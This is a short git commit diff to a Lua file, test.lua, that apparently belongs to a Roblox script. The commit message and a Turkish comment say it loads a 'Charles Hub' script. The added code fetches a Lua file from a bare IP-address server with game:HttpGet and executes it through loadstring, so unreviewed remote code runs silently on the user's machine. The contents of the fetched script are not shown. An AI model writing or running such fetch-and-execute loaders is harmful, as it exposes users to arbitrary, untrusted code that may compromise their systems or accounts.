b8b95627d49eb390b0fa199e3c502f5be0e6af79
charlesdgn1-cmyk <charlesdgn1@gmail.com>
2026-02-11 02:36:02 +0300

    Modify test.lua to load Charles Hub script
    Updated script to load Charles Hub from specified server.

--- test.lua
+++ test.lua
@@ -1,1 +1,4 @@
-http://91.232.103.225/scripts/charles-hub.lua
+-- Charles Hub'ı Belirtilen Sunucudan Çeker ve Çalıştırır
+pcall(function()
+    loadstring(game:HttpGet("http://91.232.103.225/scripts/charles-hub.lua"))()
+end)
